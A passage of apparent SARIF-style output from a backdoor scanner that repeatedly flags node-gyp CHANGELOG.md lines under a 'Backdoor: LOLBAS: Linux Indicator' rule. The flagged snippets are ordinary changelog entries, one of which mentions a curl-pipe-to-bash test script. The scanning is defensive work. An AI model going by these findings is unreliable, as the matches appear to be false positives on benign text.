                      "text": "yp/pull/1794)\n* [[`bb92c761a9`](https://github.com/nodejs/node-gyp/commit/bb92c761a9)] - **test**: add Node.js 6 on Windows to Travis CI (João Reis) [#1812](https://github.com/nodejs/node-gyp/pull/1812)\n* [[`7fd924079f`](https://github.com/nodejs/node-gyp/commit/7fd924079f)] - **test**: increase tap timeout (João Reis) [#1812](https://github.com/nodejs/node-gyp/pull/1812)\n* [[`7e8127068f`](https://github.com/nodejs/node-gyp/commit/7e8127068f)] - **test**: cover supported node versions with travis (Rod Vagg) [#1809](https://github.com/nodejs/node-gyp/pull/1809)\n* [[`24109148df`](https://github.com/nodej",
                      "markdown": "`yp/pull/1794)\n* [[`bb92c761a9`](https://github.com/nodejs/node-gyp/commit/bb92c761a9)] - **test**: add Node.js 6 on Windows to Travis CI (João Reis) [#1812](https://github.com/nodejs/node-gyp/pull/1812)\n* [[`7fd924079f`](https://github.com/nodejs/node-gyp/commit/7fd924079f)] - **test**: increase tap timeout (João Reis) [#1812](https://github.com/nodejs/node-gyp/pull/1812)\n* [[`7e8127068f`](https://github.com/nodejs/node-gyp/commit/7e8127068f)] - **test**: cover supported node versions with travis (Rod Vagg) [#1809](https://github.com/nodejs/node-gyp/pull/1809)\n* [[`24109148df`](https://github.com/nodej`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 660,
                  "startColumn": 91,
                  "endLine": 660,
                  "endColumn": 96,
                  "snippet": {
                    "text": " [[`60a4083523`](https://github.com/nodejs/node-gyp/commit/60a4083523)] - **doc**: update xcode install instructions to match Node's BUILDING (Nhan Khong) [#1884](https://github.com/nodejs/node-gyp/pull/1884)\n* [[`19dbc9ac32`](https://github.com/nodejs/node-gyp/commit/19dbc9ac32)] - **deps**: update tar to 4.4.12 (Matheus Marchini) [#1889](https://github.com/nodejs/node-gyp/pull/1889)\n* [[`5f3ed92181`](https://github.com/nodejs/node-gyp/commit/5f3ed92181)] - **bin**: fix the usage instructions (Halit Ogunc) [#1888](https://github.com/nodejs/node-gyp/pull/1888)\n* [[`aab118edf1`](https://github.com/n",
                    "rendered": {
                      "text": " [[`60a4083523`](https://github.com/nodejs/node-gyp/commit/60a4083523)] - **doc**: update xcode install instructions to match Node's BUILDING (Nhan Khong) [#1884](https://github.com/nodejs/node-gyp/pull/1884)\n* [[`19dbc9ac32`](https://github.com/nodejs/node-gyp/commit/19dbc9ac32)] - **deps**: update tar to 4.4.12 (Matheus Marchini) [#1889](https://github.com/nodejs/node-gyp/pull/1889)\n* [[`5f3ed92181`](https://github.com/nodejs/node-gyp/commit/5f3ed92181)] - **bin**: fix the usage instructions (Halit Ogunc) [#1888](https://github.com/nodejs/node-gyp/pull/1888)\n* [[`aab118edf1`](https://github.com/n",
                      "markdown": "` [[`60a4083523`](https://github.com/nodejs/node-gyp/commit/60a4083523)] - **doc**: update xcode install instructions to match Node's BUILDING (Nhan Khong) [#1884](https://github.com/nodejs/node-gyp/pull/1884)\n* [[`19dbc9ac32`](https://github.com/nodejs/node-gyp/commit/19dbc9ac32)] - **deps**: update tar to 4.4.12 (Matheus Marchini) [#1889](https://github.com/nodejs/node-gyp/pull/1889)\n* [[`5f3ed92181`](https://github.com/nodejs/node-gyp/commit/5f3ed92181)] - **bin**: fix the usage instructions (Halit Ogunc) [#1888](https://github.com/nodejs/node-gyp/pull/1888)\n* [[`aab118edf1`](https://github.com/n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 610,
                  "startColumn": 95,
                  "endLine": 610,
                  "endColumn": 103,
                  "snippet": {
                    "text": "ttps://github.com/nodejs/node-gyp/commit/a3f1143514)] - **(SEMVER-MINOR)** **lib**: noproxy support, match proxy detection to `request` (Matias Lopez) [#1978](https://github.com/nodejs/node-gyp/pull/1978)\n* [[`52365819c7`](https://github.com/nodejs/node-gyp/commit/52365819c7)] - **test**: remove old docker test harness (#1993) (Rod Vagg) [#1993](https://github.com/nodejs/node-gyp/pull/1993)\n* [[`bc509c511d`](https://github.com/nodejs/node-gyp/commit/bc509c511d)] - **test**: add Windows to GitHub Actions testing (#1996) (Christian Clauss) [#1996](https://github.com/nodejs/node-gyp/pull/1996)\n* [[`91ee2",
                    "rendered": {
                      "text": "ttps://github.com/nodejs/node-gyp/commit/a3f1143514)] - **(SEMVER-MINOR)** **lib**: noproxy support, match proxy detection to `request` (Matias Lopez) [#1978](https://github.com/nodejs/node-gyp/pull/1978)\n* [[`52365819c7`](https://github.com/nodejs/node-gyp/commit/52365819c7)] - **test**: remove old docker test harness (#1993) (Rod Vagg) [#1993](https://github.com/nodejs/node-gyp/pull/1993)\n* [[`bc509c511d`](https://github.com/nodejs/node-gyp/commit/bc509c511d)] - **test**: add Windows to GitHub Actions testing (#1996) (Christian Clauss) [#1996](https://github.com/nodejs/node-gyp/pull/1996)\n* [[`91ee2",
                      "markdown": "`ttps://github.com/nodejs/node-gyp/commit/a3f1143514)] - **(SEMVER-MINOR)** **lib**: noproxy support, match proxy detection to `request` (Matias Lopez) [#1978](https://github.com/nodejs/node-gyp/pull/1978)\n* [[`52365819c7`](https://github.com/nodejs/node-gyp/commit/52365819c7)] - **test**: remove old docker test harness (#1993) (Rod Vagg) [#1993](https://github.com/nodejs/node-gyp/pull/1993)\n* [[`bc509c511d`](https://github.com/nodejs/node-gyp/commit/bc509c511d)] - **test**: add Windows to GitHub Actions testing (#1996) (Christian Clauss) [#1996](https://github.com/nodejs/node-gyp/pull/1996)\n* [[`91ee2`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 581,
                  "startColumn": 109,
                  "endLine": 581,
                  "endColumn": 115,
                  "snippet": {
                    "text": "tps://github.com/nodejs/node-gyp/commit/5a83630c33)] - **travis**: add Windows + Python 3.8 to the mix (Rod Vagg) [#1921](https://github.com/nodejs/node-gyp/pull/1921)\n\n## v6.0.0 2019-10-04\n\n* [[`dd0e97ef0b`](https://github.com/nodejs/node-gyp/commit/dd0e97ef0b)] - **(SEMVER-MAJOR)** **lib**: try to find `python` after `python3` (Sam Roberts) [#1907](https://github.com/nodejs/node-gyp/pull/1907)\n* [[`f60ed47d14`](https://github.com/nodejs/node-gyp/commit/f60ed47d14)] - **travis**: add Python 3.5 and 3.6 tests on Linux (Christian Clauss) [#1903](https://github.com/nodejs/node-gyp/pull/1903)\n* [[`c763",
                    "rendered": {
                      "text": "tps://github.com/nodejs/node-gyp/commit/5a83630c33)] - **travis**: add Windows + Python 3.8 to the mix (Rod Vagg) [#1921](https://github.com/nodejs/node-gyp/pull/1921)\n\n## v6.0.0 2019-10-04\n\n* [[`dd0e97ef0b`](https://github.com/nodejs/node-gyp/commit/dd0e97ef0b)] - **(SEMVER-MAJOR)** **lib**: try to find `python` after `python3` (Sam Roberts) [#1907](https://github.com/nodejs/node-gyp/pull/1907)\n* [[`f60ed47d14`](https://github.com/nodejs/node-gyp/commit/f60ed47d14)] - **travis**: add Python 3.5 and 3.6 tests on Linux (Christian Clauss) [#1903](https://github.com/nodejs/node-gyp/pull/1903)\n* [[`c763",
                      "markdown": "`tps://github.com/nodejs/node-gyp/commit/5a83630c33)] - **travis**: add Windows + Python 3.8 to the mix (Rod Vagg) [#1921](https://github.com/nodejs/node-gyp/pull/1921)\n\n## v6.0.0 2019-10-04\n\n* [[`dd0e97ef0b`](https://github.com/nodejs/node-gyp/commit/dd0e97ef0b)] - **(SEMVER-MAJOR)** **lib**: try to find `python` after `python3` (Sam Roberts) [#1907](https://github.com/nodejs/node-gyp/pull/1907)\n* [[`f60ed47d14`](https://github.com/nodejs/node-gyp/commit/f60ed47d14)] - **travis**: add Python 3.5 and 3.6 tests on Linux (Christian Clauss) [#1903](https://github.com/nodejs/node-gyp/pull/1903)\n* [[`c763`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 552,
                  "startColumn": 95,
                  "endLine": 552,
                  "endColumn": 103,
                  "snippet": {
                    "text": "ttps://github.com/nodejs/node-gyp/commit/3bcba2a01a)] - **(SEMVER-MINOR)** **lib**: noproxy support, match proxy detection to `request` (Matias Lopez) [#1978](https://github.com/nodejs/node-gyp/pull/1978)\n* [[`470cc2178e`](https://github.com/nodejs/node-gyp/commit/470cc2178e)] - **test**: remove old docker test harness (#1993) (Rod Vagg) [#1993](https://github.com/nodejs/node-gyp/pull/1993)\n* [[`31ecc8421d`](https://github.com/nodejs/node-gyp/commit/31ecc8421d)] - **test**: add Windows to GitHub Actions testing (#1996) (Christian Clauss) [#1996](https://github.com/nodejs/node-gyp/pull/1996)\n* [[`5a729",
                    "rendered": {
                      "text": "ttps://github.com/nodejs/node-gyp/commit/3bcba2a01a)] - **(SEMVER-MINOR)** **lib**: noproxy support, match proxy detection to `request` (Matias Lopez) [#1978](https://github.com/nodejs/node-gyp/pull/1978)\n* [[`470cc2178e`](https://github.com/nodejs/node-gyp/commit/470cc2178e)] - **test**: remove old docker test harness (#1993) (Rod Vagg) [#1993](https://github.com/nodejs/node-gyp/pull/1993)\n* [[`31ecc8421d`](https://github.com/nodejs/node-gyp/commit/31ecc8421d)] - **test**: add Windows to GitHub Actions testing (#1996) (Christian Clauss) [#1996](https://github.com/nodejs/node-gyp/pull/1996)\n* [[`5a729",
                      "markdown": "`ttps://github.com/nodejs/node-gyp/commit/3bcba2a01a)] - **(SEMVER-MINOR)** **lib**: noproxy support, match proxy detection to `request` (Matias Lopez) [#1978](https://github.com/nodejs/node-gyp/pull/1978)\n* [[`470cc2178e`](https://github.com/nodejs/node-gyp/commit/470cc2178e)] - **test**: remove old docker test harness (#1993) (Rod Vagg) [#1993](https://github.com/nodejs/node-gyp/pull/1993)\n* [[`31ecc8421d`](https://github.com/nodejs/node-gyp/commit/31ecc8421d)] - **test**: add Windows to GitHub Actions testing (#1996) (Christian Clauss) [#1996](https://github.com/nodejs/node-gyp/pull/1996)\n* [[`5a729`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 520,
                  "startColumn": 129,
                  "endLine": 520,
                  "endColumn": 137,
                  "snippet": {
                    "text": "//github.com/nodejs/node-gyp/commit/ba4f34b7d6)] - **doc**: update catalina xcode clt download link (Dario Vladovic) [#2133](https://github.com/nodejs/node-gyp/pull/2133)\n* [[`f7bfce96ed`](https://github.com/nodejs/node-gyp/commit/f7bfce96ed)] - **doc**: update acid test and introduce curl|bash test script (Dario Vladovic) [#2105](https://github.com/nodejs/node-gyp/pull/2105)\n* [[`e529f3309d`](https://github.com/nodejs/node-gyp/commit/e529f3309d)] - **doc**: update README to reflect upgrade to gyp-next (Ujjwal Sharma) [#2092](https://github.com/nodejs/node-gyp/pull/2092)\n* [[`9aed6286a3`](https://gith",
                    "rendered": {
                      "text": "//github.com/nodejs/node-gyp/commit/ba4f34b7d6)] - **doc**: update catalina xcode clt download link (Dario Vladovic) [#2133](https://github.com/nodejs/node-gyp/pull/2133)\n* [[`f7bfce96ed`](https://github.com/nodejs/node-gyp/commit/f7bfce96ed)] - **doc**: update acid test and introduce curl|bash test script (Dario Vladovic) [#2105](https://github.com/nodejs/node-gyp/pull/2105)\n* [[`e529f3309d`](https://github.com/nodejs/node-gyp/commit/e529f3309d)] - **doc**: update README to reflect upgrade to gyp-next (Ujjwal Sharma) [#2092](https://github.com/nodejs/node-gyp/pull/2092)\n* [[`9aed6286a3`](https://gith",
                      "markdown": "`//github.com/nodejs/node-gyp/commit/ba4f34b7d6)] - **doc**: update catalina xcode clt download link (Dario Vladovic) [#2133](https://github.com/nodejs/node-gyp/pull/2133)\n* [[`f7bfce96ed`](https://github.com/nodejs/node-gyp/commit/f7bfce96ed)] - **doc**: update acid test and introduce curl|bash test script (Dario Vladovic) [#2105](https://github.com/nodejs/node-gyp/pull/2105)\n* [[`e529f3309d`](https://github.com/nodejs/node-gyp/commit/e529f3309d)] - **doc**: update README to reflect upgrade to gyp-next (Ujjwal Sharma) [#2092](https://github.com/nodejs/node-gyp/pull/2092)\n* [[`9aed6286a3`](https://gith`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 511,
                  "startColumn": 93,
                  "endLine": 511,
                  "endColumn": 99,
                  "snippet": {
                    "text": "\n* * [[`ee6fa7d3bc`](https://github.com/nodejs/node-gyp/commit/ee6fa7d3bc)] - **docs**: note that node-gyp@7 should solve Catalina CLT issues (Rod Vagg) [#2156](https://github.com/nodejs/node-gyp/pull/2156)\n* * [[`4fc8ff179d`](https://github.com/nodejs/node-gyp/commit/4fc8ff179d)] - **doc**: silence curl for macOS Catalina acid test (Chia Wei Ong) [#2150](https://github.com/nodejs/node-gyp/pull/2150)\n* * [[`7857cb2eb1`](https://github.com/nodejs/node-gyp/commit/7857cb2eb1)] - **deps**: increase \"engines\" to \"node\" : \"\\>= 10.12.0\" (DeeDeeG) [#2153](https://github.com/nodejs/node-gyp/pull/2153)\n\n## v7",
                    "rendered": {
                      "text": "\n* * [[`ee6fa7d3bc`](https://github.com/nodejs/node-gyp/commit/ee6fa7d3bc)] - **docs**: note that node-gyp@7 should solve Catalina CLT issues (Rod Vagg) [#2156](https://github.com/nodejs/node-gyp/pull/2156)\n* * [[`4fc8ff179d`](https://github.com/nodejs/node-gyp/commit/4fc8ff179d)] - **doc**: silence curl for macOS Catalina acid test (Chia Wei Ong) [#2150](https://github.com/nodejs/node-gyp/pull/2150)\n* * [[`7857cb2eb1`](https://github.com/nodejs/node-gyp/commit/7857cb2eb1)] - **deps**: increase \"engines\" to \"node\" : \"\\>= 10.12.0\" (DeeDeeG) [#2153](https://github.com/nodejs/node-gyp/pull/2153)\n\n## v7",
                      "markdown": "`\n* * [[`ee6fa7d3bc`](https://github.com/nodejs/node-gyp/commit/ee6fa7d3bc)] - **docs**: note that node-gyp@7 should solve Catalina CLT issues (Rod Vagg) [#2156](https://github.com/nodejs/node-gyp/pull/2156)\n* * [[`4fc8ff179d`](https://github.com/nodejs/node-gyp/commit/4fc8ff179d)] - **doc**: silence curl for macOS Catalina acid test (Chia Wei Ong) [#2150](https://github.com/nodejs/node-gyp/pull/2150)\n* * [[`7857cb2eb1`](https://github.com/nodejs/node-gyp/commit/7857cb2eb1)] - **deps**: increase \"engines\" to \"node\" : \"\\>= 10.12.0\" (DeeDeeG) [#2153](https://github.com/nodejs/node-gyp/pull/2153)\n\n## v7`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 507,
                  "startColumn": 100,
                  "endLine": 507,
                  "endColumn": 108,
                  "snippet": {
                    "text": "com/nodejs/node-gyp/commit/2cca9b74f7)] - **doc**: drop the --production flag for installing windows-build-tools (DeeDeeG) [#2206](https://github.com/nodejs/node-gyp/pull/2206)\n\n## v7.1.0 2020-08-12\n\n* [[`aaf33c3029`](https://github.com/nodejs/node-gyp/commit/aaf33c3029)] - **build**: add update-gyp script (Samuel Attard) [#2167](https://github.com/nodejs/node-gyp/pull/2167)\n* * [[`3baa4e4172`](https://github.com/nodejs/node-gyp/commit/3baa4e4172)] - **(SEMVER-MINOR)** **gyp**: update gyp to 0.4.0 (Samuel Attard) [#2165](https://github.com/nodejs/node-gyp/pull/2165)\n* * [[`f461d56c53`](https://github.",
                    "rendered": {
                      "text": "com/nodejs/node-gyp/commit/2cca9b74f7)] - **doc**: drop the --production flag for installing windows-build-tools (DeeDeeG) [#2206](https://github.com/nodejs/node-gyp/pull/2206)\n\n## v7.1.0 2020-08-12\n\n* [[`aaf33c3029`](https://github.com/nodejs/node-gyp/commit/aaf33c3029)] - **build**: add update-gyp script (Samuel Attard) [#2167](https://github.com/nodejs/node-gyp/pull/2167)\n* * [[`3baa4e4172`](https://github.com/nodejs/node-gyp/commit/3baa4e4172)] - **(SEMVER-MINOR)** **gyp**: update gyp to 0.4.0 (Samuel Attard) [#2165](https://github.com/nodejs/node-gyp/pull/2165)\n* * [[`f461d56c53`](https://github.",
                      "markdown": "`com/nodejs/node-gyp/commit/2cca9b74f7)] - **doc**: drop the --production flag for installing windows-build-tools (DeeDeeG) [#2206](https://github.com/nodejs/node-gyp/pull/2206)\n\n## v7.1.0 2020-08-12\n\n* [[`aaf33c3029`](https://github.com/nodejs/node-gyp/commit/aaf33c3029)] - **build**: add update-gyp script (Samuel Attard) [#2167](https://github.com/nodejs/node-gyp/pull/2167)\n* * [[`3baa4e4172`](https://github.com/nodejs/node-gyp/commit/3baa4e4172)] - **(SEMVER-MINOR)** **gyp**: update gyp to 0.4.0 (Samuel Attard) [#2165](https://github.com/nodejs/node-gyp/pull/2165)\n* * [[`f461d56c53`](https://github.`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 455,
                  "startColumn": 29,
                  "endLine": 455,
                  "endColumn": 35,
                  "snippet": {
                    "text": "\n### Core\n\n* fail gracefully if we can't find the username ([#2375](https://www.github.com/nodejs/node-gyp/issues/2375)) ([fca4795](https://www.github.com/nodejs/node-gyp/commit/fca4795512c67dc8420aaa0d913b5b89a4b147f3))\n* log as yes/no whether build dir was created ([#2370](https://www.github.com/nodejs/node-gyp/issues/2370)) ([245dee5](https://www.github.com/nodejs/node-gyp/commit/245dee5b62581309946872ae253226ea3a42c0e3))\n\n\n",
                    "rendered": {
                      "text": "\n### Core\n\n* fail gracefully if we can't find the username ([#2375](https://www.github.com/nodejs/node-gyp/issues/2375)) ([fca4795](https://www.github.com/nodejs/node-gyp/commit/fca4795512c67dc8420aaa0d913b5b89a4b147f3))\n* log as yes/no whether build dir was created ([#2370](https://www.github.com/nodejs/node-gyp/issues/2370)) ([245dee5](https://www.github.com/nodejs/node-gyp/commit/245dee5b62581309946872ae253226ea3a42c0e3))\n\n\n",
                      "markdown": "`\n### Core\n\n* fail gracefully if we can't find the username ([#2375](https://www.github.com/nodejs/node-gyp/issues/2375)) ([fca4795](https://www.github.com/nodejs/node-gyp/commit/fca4795512c67dc8420aaa0d913b5b89a4b147f3))\n* log as yes/no whether build dir was created ([#2370](https://www.github.com/nodejs/node-gyp/issues/2370)) ([245dee5](https://www.github.com/nodejs/node-gyp/commit/245dee5b62581309946872ae253226ea3a42c0e3))\n\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 438,
                  "startColumn": 42,
                  "endLine": 438,
                  "endColumn": 48,
                  "snippet": {
                    "text": "f2d0](https://www.github.com/nodejs/node-gyp/commit/4a7f2d0d869a65c99a78504976567017edadf657))\n* **wiki:** Updated Updating npm's bundled node gyp (markdown) ([979a706](https://www.github.com/nodejs/node-gyp/commit/979a7063b950c088a7f4896fc3a48e1d00dfd231))\n* **wiki:** Updated Updating npm's bundled node gyp (markdown) ([e50e04d](https://www.github.com/nodejs/node-gyp/commit/e50e04d7b6a3754ea0aa11fe8cef491b3bc5bdd4))\n\n## [8.1.0](https://www.github.com/nodejs/node-gyp/compare/v8.0.0...v8.1.0) (2021-05-28)\n\n\n### Features\n\n* **gyp:** update gyp to v0.9.1 ([#2402](https://www.github.com/nodejs/node-gyp/",
                    "rendered": {
                      "text": "f2d0](https://www.github.com/nodejs/node-gyp/commit/4a7f2d0d869a65c99a78504976567017edadf657))\n* **wiki:** Updated Updating npm's bundled node gyp (markdown) ([979a706](https://www.github.com/nodejs/node-gyp/commit/979a7063b950c088a7f4896fc3a48e1d00dfd231))\n* **wiki:** Updated Updating npm's bundled node gyp (markdown) ([e50e04d](https://www.github.com/nodejs/node-gyp/commit/e50e04d7b6a3754ea0aa11fe8cef491b3bc5bdd4))\n\n## [8.1.0](https://www.github.com/nodejs/node-gyp/compare/v8.0.0...v8.1.0) (2021-05-28)\n\n\n### Features\n\n* **gyp:** update gyp to v0.9.1 ([#2402](https://www.github.com/nodejs/node-gyp/",
                      "markdown": "`f2d0](https://www.github.com/nodejs/node-gyp/commit/4a7f2d0d869a65c99a78504976567017edadf657))\n* **wiki:** Updated Updating npm's bundled node gyp (markdown) ([979a706](https://www.github.com/nodejs/node-gyp/commit/979a7063b950c088a7f4896fc3a48e1d00dfd231))\n* **wiki:** Updated Updating npm's bundled node gyp (markdown) ([e50e04d](https://www.github.com/nodejs/node-gyp/commit/e50e04d7b6a3754ea0aa11fe8cef491b3bc5bdd4))\n\n## [8.1.0](https://www.github.com/nodejs/node-gyp/compare/v8.0.0...v8.1.0) (2021-05-28)\n\n\n### Features\n\n* **gyp:** update gyp to v0.9.1 ([#2402](https://www.github.com/nodejs/node-gyp/`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 437,
                  "startColumn": 42,
                  "endLine": 437,
                  "endColumn": 48,
                  "snippet": {
                    "text": "61e9](https://www.github.com/nodejs/node-gyp/commit/33561e9cbf5f4eb46111318503c77df2c6eb484a))\n* **wiki:** Updated Updating npm's bundled node gyp (markdown) ([4a7f2d0](https://www.github.com/nodejs/node-gyp/commit/4a7f2d0d869a65c99a78504976567017edadf657))\n* **wiki:** Updated Updating npm's bundled node gyp (markdown) ([979a706](https://www.github.com/nodejs/node-gyp/commit/979a7063b950c088a7f4896fc3a48e1d00dfd231))\n* **wiki:** Updated Updating npm's bundled node gyp (markdown) ([e50e04d](https://www.github.com/nodejs/node-gyp/commit/e50e04d7b6a3754ea0aa11fe8cef491b3bc5bdd4))\n\n## [8.1.0](https://ww",
                    "rendered": {
                      "text": "61e9](https://www.github.com/nodejs/node-gyp/commit/33561e9cbf5f4eb46111318503c77df2c6eb484a))\n* **wiki:** Updated Updating npm's bundled node gyp (markdown) ([4a7f2d0](https://www.github.com/nodejs/node-gyp/commit/4a7f2d0d869a65c99a78504976567017edadf657))\n* **wiki:** Updated Updating npm's bundled node gyp (markdown) ([979a706](https://www.github.com/nodejs/node-gyp/commit/979a7063b950c088a7f4896fc3a48e1d00dfd231))\n* **wiki:** Updated Updating npm's bundled node gyp (markdown) ([e50e04d](https://www.github.com/nodejs/node-gyp/commit/e50e04d7b6a3754ea0aa11fe8cef491b3bc5bdd4))\n\n## [8.1.0](https://ww",
                      "markdown": "`61e9](https://www.github.com/nodejs/node-gyp/commit/33561e9cbf5f4eb46111318503c77df2c6eb484a))\n* **wiki:** Updated Updating npm's bundled node gyp (markdown) ([4a7f2d0](https://www.github.com/nodejs/node-gyp/commit/4a7f2d0d869a65c99a78504976567017edadf657))\n* **wiki:** Updated Updating npm's bundled node gyp (markdown) ([979a706](https://www.github.com/nodejs/node-gyp/commit/979a7063b950c088a7f4896fc3a48e1d00dfd231))\n* **wiki:** Updated Updating npm's bundled node gyp (markdown) ([e50e04d](https://www.github.com/nodejs/node-gyp/commit/e50e04d7b6a3754ea0aa11fe8cef491b3bc5bdd4))\n\n## [8.1.0](https://ww`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 436,
                  "startColumn": 42,
                  "endLine": 436,
                  "endColumn": 48,
                  "snippet": {
                    "text": "58b0](https://www.github.com/nodejs/node-gyp/commit/11858b0655d1eee00c62ad628e719d4378803d14))\n* **wiki:** Updated Updating npm's bundled node gyp (markdown) ([33561e9](https://www.github.com/nodejs/node-gyp/commit/33561e9cbf5f4eb46111318503c77df2c6eb484a))\n* **wiki:** Updated Updating npm's bundled node gyp (markdown) ([4a7f2d0](https://www.github.com/nodejs/node-gyp/commit/4a7f2d0d869a65c99a78504976567017edadf657))\n* **wiki:** Updated Updating npm's bundled node gyp (markdown) ([979a706](https://www.github.com/nodejs/node-gyp/commit/979a7063b950c088a7f4896fc3a48e1d00dfd231))\n* **wiki:** Updated Up",
                    "rendered": {
                      "text": "58b0](https://www.github.com/nodejs/node-gyp/commit/11858b0655d1eee00c62ad628e719d4378803d14))\n* **wiki:** Updated Updating npm's bundled node gyp (markdown) ([33561e9](https://www.github.com/nodejs/node-gyp/commit/33561e9cbf5f4eb46111318503c77df2c6eb484a))\n* **wiki:** Updated Updating npm's bundled node gyp (markdown) ([4a7f2d0](https://www.github.com/nodejs/node-gyp/commit/4a7f2d0d869a65c99a78504976567017edadf657))\n* **wiki:** Updated Updating npm's bundled node gyp (markdown) ([979a706](https://www.github.com/nodejs/node-gyp/commit/979a7063b950c088a7f4896fc3a48e1d00dfd231))\n* **wiki:** Updated Up",
                      "markdown": "`58b0](https://www.github.com/nodejs/node-gyp/commit/11858b0655d1eee00c62ad628e719d4378803d14))\n* **wiki:** Updated Updating npm's bundled node gyp (markdown) ([33561e9](https://www.github.com/nodejs/node-gyp/commit/33561e9cbf5f4eb46111318503c77df2c6eb484a))\n* **wiki:** Updated Updating npm's bundled node gyp (markdown) ([4a7f2d0](https://www.github.com/nodejs/node-gyp/commit/4a7f2d0d869a65c99a78504976567017edadf657))\n* **wiki:** Updated Updating npm's bundled node gyp (markdown) ([979a706](https://www.github.com/nodejs/node-gyp/commit/979a7063b950c088a7f4896fc3a48e1d00dfd231))\n* **wiki:** Updated Up`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
